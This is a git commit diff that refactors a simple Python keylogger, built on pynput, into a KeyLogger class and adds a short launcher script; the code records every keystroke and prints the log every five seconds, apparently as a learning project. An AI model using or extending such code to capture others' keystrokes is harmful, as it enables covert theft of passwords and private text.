d4e4ad37c357664f92e3263d21c70f7a9953e3db
Jonathan Cohen <jcohen66@optonline.net>
2020-01-25 12:36:04 -0500

    moved keylogger to basic class

--- keylogger.py
+++ keylogger.py
@@ -5,27 +5,29 @@ import threading
 log = ''
 
 
-def process_key_press(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + ' '
-        else:
-            log = log + ' ' + str(key) + ' '
+class KeyLogger:
 
+    def process_key_press(self, key):
+        global log
+        try:
+            log = log + str(key.char)
+        except AttributeError:
+            if key == key.space:
+                log = log + ' '
+            else:
+                log = log + ' ' + str(key) + ' '
 
-def report():
-    global log
-    print(log)
-    log = ''
-    timer = threading.Timer(5, report)
-    timer.start()
+    def report(self):
+        global log
+        print(log)
+        log = ''
+        timer = threading.Timer(5, self.report)
+        timer.start()
 
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(
+            on_press=self.process_key_press)
 
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
-
-with keyboard_listener:
-    report()
-    keyboard_listener.join()
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
---
+++ zlogger.py
@@ -0,0 +1,6 @@
+#!/usr/bin/env python3k
+
+import keylogger
+
+my_keylogger = keylogger.KeyLogger()
+my_keylogger.start()
